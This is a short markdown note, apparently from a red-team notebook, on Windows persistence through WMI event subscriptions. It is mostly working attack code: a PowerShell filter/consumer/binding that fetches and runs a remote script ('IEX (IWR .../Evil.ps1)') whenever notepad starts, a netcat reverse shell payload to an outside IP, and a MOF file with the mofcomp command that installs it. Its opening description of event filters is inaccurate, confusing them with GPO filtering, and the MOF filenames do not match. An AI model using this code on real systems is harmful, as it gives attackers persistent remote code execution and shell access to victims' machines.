# WMI Subscription

`WMI Event Filter`let you dynamically detect the scope of Group Policy objects (GPOs), based on the attributes of the targeted computer

```wmi
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    EventNamespace = 'root/CIMV2'
    Name = 'Malicious Filter'
    Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA "Win32_Process" AND TargetInstance.Name = "notepad.exe"'
    QueryLanguage = 'WQL'
}
```

`WMI Event Consumer`  defines what the system should do with any events caught by the filter

```
$Command = 'powershell.exe -Command IEX (IWR http://10.0.2.15:1337/Evil.ps1)'

$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = 'Malicious Consumer'
    CommandLineTemplate = $Command
}
```

`WMI Binding` Binds Filter and Consumer Classes 

```
Set-WmiInstance -Name root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```

### payload

nooranet.scr

```cmd
nc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe
```

## MOF

Managed object format (MOF) is the language used to describe CIM (Common Information Model) classes. A MOF file typically contains statements. classes and class instances which are added to the WMI repository (OBJECTS.DATA) when the file is compiled (mofcomp.exe can compile MOF files and it is part of Windows)

#### nooranet.mof

```
#PRAGMA NAMESPACE ("\\\\.\\root\\subscription")
instance of CommandLineEventConsumer as $Cons
{
    Name = "NooraNet";
    RunInteractively=false;
    CommandLineTemplate="cmd.exe";
};
instance of __EventFilter as $Filt
{
    Name = "NooraNet";
    EventNamespace = "root\\subscription";
    Query ="SELECT * FROM __InstanceCreationEvent Within 3"
            "Where TargetInstance Isa \"Win32_Process\" "
            "And Targetinstance.Name = \"notepad.exe\" ";
    QueryLanguage = "WQL";
};
instance of __FilterToConsumerBinding
{ 
     Filter = $Filt;
     Consumer = $Cons;
};
```

### Compile MOF File

```cmd
mofcomp.exe .\nss.mof
```
